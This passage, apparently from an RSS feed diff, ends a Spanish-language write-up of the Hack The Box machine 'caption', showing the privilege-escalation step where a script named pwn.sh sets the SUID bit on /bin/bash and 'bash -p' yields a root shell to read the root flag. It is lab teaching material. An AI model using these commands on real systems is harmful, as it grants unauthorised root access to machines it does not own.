+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>20:15:07.462286 IP caption.htb &gt; 10.10.14.104: ICMP echo request, id 4, seq 1, length 64
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>20:15:07.462559 IP 10.10.14.104 &gt; caption.htb: ICMP echo reply, id 4, seq 1, length 64
+</span></span></code></pre></div>
+<p>Ahora modificamos el script malicioso para darle el bit de SUID a la <code>bash</code> para poder lanzarnos una consola privilegiada.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>margo@caption:/tmp$ cat /tmp/pwn.sh 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>#!/bin/bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span><span style="color:#f00"></span>chmod u+s /bin/bash
+</span></span></code></pre></div>
+<p>Y si lanzamos otra vez nuestro script y comprobamos la <code>bash</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>margo@caption:/tmp$ ls -la /bin/bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
+</span></span></code></pre></div>
+<p>Por lo cual simplemente para escalar privilegios podemos lanzarnos una <code>bash</code> como el propietario con <code>bash -p</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>bash-5.1# id
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>uid=1000(margo) gid=1000(margo) euid=0(root) groups=1000(margo)
+</span></span></code></pre></div>
+<p>Podemos leer la flag de <code>root</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>bash-5.1# cat /root/root.txt 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>993de3b56e4e458...
+</span></span></code></pre></div>
+<p>¡Y ya estaría!</p>
+<p>Happy Hacking! 🚀</p>
+]]></content:encoded>
+    </item>
+  </channel>
+</rss>
